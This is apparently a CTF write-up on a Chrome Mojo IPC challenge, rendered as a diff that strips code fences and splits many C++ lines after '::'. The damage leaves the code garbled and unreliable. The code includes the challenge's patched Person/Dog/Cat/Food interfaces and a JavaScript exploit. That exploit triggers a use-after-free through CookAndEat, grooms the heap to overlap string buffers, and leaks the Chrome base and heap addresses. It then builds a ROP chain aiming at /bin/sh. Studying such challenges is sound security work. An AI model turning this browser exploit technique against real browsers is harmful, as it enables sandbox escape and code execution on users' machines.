@@ -10,11 +10,6 @@ module test.echo.mojom;
 interface Echo {
  EchoInteger(int32 value) => (int32 result);
 };
-```
-
-
-
-```
 import("//mojo/public/tools/bindings/mojom.gni")
 
 mojom("interfaces") {
@@ -22,23 +17,9 @@ mojom("interfaces") {
     "echo.mojom",
  ]
 }
-```
-
-
-
-```
-ninja -C out/r services/echo/public/interfaces:interfaces_js
-```
-
-
-
-```
+ninja -C out/r services/echo/public/interfaces:
+interfaces_js
 out/gen/services/echo/public/interfaces/echo.mojom.js
-```
-
-
-
-```
 <!DOCTYPE html>
 <script src="URL/to/mojo_bindings.js"></script>
 <script src="URL/to/echo.mojom.js"></script>
@@ -49,11 +30,6 @@ var echoRequest = mojo.makeRequest(echoPtr);
 // ...
 
 </script>
-```
-
-
-
-```
 <!DOCTYPE html>
 <script src="URL/to/mojo_bindings.js"></script>
 <script src="URL/to/echo.mojom.js"></script>
@@ -74,18 +50,8 @@ echoServicePtr.echoInteger({value: 123}).then(function(response) {
 });
 
 </script>
-```
-
-
-
-```
 $ ls
 Dockerfile       build_docker.sh chrome_diff.diff flag             interfaces       note             run_docker.sh   src
-```
-
-
-
-```
 args = [
     './binary/chrome',
     '--enable-blink-features=MojoJS',
@@ -94,22 +60,20 @@ args = [
     '--repl', #this flag makes chrome not to exit right after the webpage is loaded, this flag is not a part of the CTF challenge
     server
  ]
-```
-
-
-
-```
 diff --git a/content/public/app/content_browser_manifest.cc b/content/public/app/content_browser_manifest.cc
 index a1fa37e05edf..a1034e1b1a40 100644
 --- a/content/public/app/content_browser_manifest.cc
 +++ b/content/public/app/content_browser_manifest.cc
-@@ -197,6 +197,7 @@ const service_manager::Manifest& GetContentBrowserManifest() {
+@@ -197,6 +197,7 @@ const service_manager::
+Manifest& GetContentBrowserManifest() {
            .ExposeInterfaceFilterCapability_Deprecated(
-               "navigation:frame", "renderer",
-               std::set<const char*>{
+               "navigation:
+frame", "renderer",
+               std::
+set<const char*>{
 +                 "blink.mojom.BeingCreatorInterface",
                    "autofill.mojom.AutofillDriver",
-                   
+                  
 ...
 +import "url/mojom/origin.mojom";
 +import "third_party/blink/public/mojom/CTF/person_interface.mojom";
@@ -121,11 +85,6 @@ index a1fa37e05edf..a1034e1b1a40 100644
 + CreateDog() => (blink.mojom.DogInterface? dog);
 + CreateCat() => (blink.mojom.CatInterface? cat);
 +};
-```
-
-
-
-```
 +interface PersonInterface {
 + GetName() => (string name);
 + SetName(string new_name) => ();
@@ -135,57 +94,60 @@ index a1fa37e05edf..a1034e1b1a40 100644
 + SetWeight(uint64 new_weight) => ();
 + CookAndEat(blink.mojom.FoodInterface food) => ();
 +};
-```
-
-
-
-```
 +class CONTENT_EXPORT CatInterfaceImpl
-+   : public blink::mojom::CatInterface {
++   : public blink::
+mojom::
+CatInterface {
 +
-+ std::string name;
++ std::
+string name;
 + uint64_t age;
 + uint64_t weight;
 
 +class CONTENT_EXPORT DogInterfaceImpl
-+   : public blink::mojom::DogInterface {
++   : public blink::
+mojom::
+DogInterface {
 +
 + uint64_t weight;
-+ std::string name;
++ std::
+string name;
 + uint64_t age;
 
 +class CONTENT_EXPORT PersonInterfaceImpl
-+   : public blink::mojom::PersonInterface {
++   : public blink::
+mojom::
+PersonInterface {
 +
 + uint64_t age;
 + uint64_t weight;
-+ std::string name;
-```
-
-
-
-```
-+void PersonInterfaceImpl::CookAndEat(blink::mojom::FoodInterfacePtr foodPtr,
++ std::
+string name;
++void PersonInterfaceImpl::
+CookAndEat(blink::
+mojom::
+FoodInterfacePtr foodPtr,
 +                                     CookAndEatCallback callback) {
-+ blink::mojom::FoodInterface *raw_food = foodPtr.get();
++ blink::
+mojom::
+FoodInterface *raw_food = foodPtr.get();
 +
-+ raw_food->GetWeight(base::BindOnce(&PersonInterfaceImpl::AddWeight,
-+                                     base::Unretained(this),
-+                                     std::move(callback), std::move(foodPtr)));
++ raw_food->GetWeight(base::
+BindOnce(&PersonInterfaceImpl::
+AddWeight,
++                                     base::
+Unretained(this),
++                                     std::
+move(callback), std::
+move(foodPtr)));
 +}
-```
-
-
-
-```
-+void PersonInterfaceImpl::AddWeight(
-+   PersonInterfaceImpl::CookAndEatCallback callback,
-+   blink::mojom::FoodInterfacePtr foodPtr, uint64_t weight_)
-```
-
-
-
-```
++void PersonInterfaceImpl::
+AddWeight(
++   PersonInterfaceImpl::
+CookAndEatCallback callback,
++   blink::
+mojom::
+FoodInterfacePtr foodPtr, uint64_t weight_)
 +module blink.mojom;
 +
 +import "url/mojom/origin.mojom";
@@ -196,42 +158,42 @@ index a1fa37e05edf..a1034e1b1a40 100644
 + GetWeight() => (uint64 weight);
 + SetWeight(uint64 new_weight) => ();
 +};
-```
-
-
-
-```
-+void PersonInterfaceImpl::AddWeight(
-+   PersonInterfaceImpl::CookAndEatCallback callback,
-+   blink::mojom::FoodInterfacePtr foodPtr, uint64_t weight_) {
++void PersonInterfaceImpl::
+AddWeight(
++   PersonInterfaceImpl::
+CookAndEatCallback callback,
++   blink::
+mojom::
+FoodInterfacePtr foodPtr, uint64_t weight_) {
 + weight += weight_;
-+ std::move(callback).Run();
++ std::
+move(callback).Run();
 +}
 ...
-+void PersonInterfaceImpl::CookAndEat(blink::mojom::FoodInterfacePtr foodPtr,
++void PersonInterfaceImpl::
+CookAndEat(blink::
+mojom::
+FoodInterfacePtr foodPtr,
 +                                     CookAndEatCallback callback) {
-+ blink::mojom::FoodInterface *raw_food = foodPtr.get();
++ blink::
+mojom::
+FoodInterface *raw_food = foodPtr.get();
 +
-+ raw_food->GetWeight(base::BindOnce(&PersonInterfaceImpl::AddWeight,
-+                                     base::Unretained(this),
-+                                     std::move(callback), std::move(foodPtr)));
++ raw_food->GetWeight(base::
+BindOnce(&PersonInterfaceImpl::
+AddWeight,
++                                     base::
+Unretained(this),
++                                     std::
+move(callback), std::
+move(foodPtr)));
 +}
-```
-
-
-
-```
 struct __long
 {
     pointer   __data_;
     size_type __size_;
     size_type __cap_;
 };
-```
-
-
-
-```
 class CONTENT_EXPORT CatInterfaceImpl:
 
 pointer vtable;
@@ -258,11 +220,6 @@ pointer vtable;
   pointer   __data_;
   size_type __size_;
   size_type __cap_;
-```
-
-
-
-```
 function FoodInterfaceImpl() {}
 FoodInterfaceImpl.prototype.getWeight = async function() {
     if(!this.weight) {
@@ -287,11 +244,6 @@ FoodInterfaceImpl.prototype.getDescription = async function() {
    }
     return {'description': this.description};
 };
-```
-
-
-
-```
 let dogCount = 8;
     let catCount = 0x10;
 
@@ -303,11 +255,6 @@ let dogCount = 8;
         await dogPtr.setName('a'.repeat(stringSize))
         dogPtrArr.push(dogPtr);
    }
-```
-
-
-
-```
 // get the FoodInterface in render process
     var foodInterfacePtr = new blink.mojom.FoodInterfacePtr();
     var foodInterfaceRequest = mojo.makeRequest(foodInterfacePtr);
@@ -315,18 +262,8 @@ let dogCount = 8;
         blink.mojom.FoodInterface,
         new FoodInterfaceImpl(),
         foodInterfaceRequest);
-```
-
-
-
-```
 // trigger uaf vuln
     dogPtrArr[dogPtrArr.length-1].cookAndEat(foodInterfacePtr)
-```
-
-
-
-```
 // the getWeight of FoodInterfaceImpl, which forms a uaf vuln.
     FoodInterfaceImpl.prototype.getWeight = async function() {
 
@@ -352,11 +289,6 @@ let dogCount = 8;
         // return 0x40 will change one cat's name to the Neighboring cat's name, which will form a overlap chunk.
         return {'weight': 0x40};
    };
-```
-
-
-
-```
 // find the evil cat and victim cat
     let evilIdx = -1;
     let evil = undefined;
@@ -383,11 +315,6 @@ let dogCount = 8;
     console.log("[+] evil cat idx: "+evilIdx);
     console.log("[+] victim cat idx: "+victimIdx);
     console.log("[+] evil cat name: "+name);
-```
-
-
-
-```
 // change the victim cat's name, now the evil cat name pointer will be freed
     victim.setName('a'.repeat(stringSize*200));
 
@@ -411,11 +338,6 @@ let dogCount = 8;
    }
     console.log("[+] chrome base addr: "+hex(baseAddr));
     console.log("[+] leak heap addr: "+hex(leakHeapAddr));
-```
-
-
-
-```
 // build rop chain
     let binshAddr = leakHeapAddr+0x68n;
     let ropBuffer = new ArrayBuffer(ropBufferSize);
@@ -454,11 +376,6 @@ let dogCount = 8;
 
     // trigger rop
     console.log((await triggerPersonPtr.getName()).name);
-```
-
-
-
-```
 mojo.internal.Buffer.prototype.setUint64 = function(offset, value) {
     value = BigInt(value);
     let multipliter = 0x100000000n;
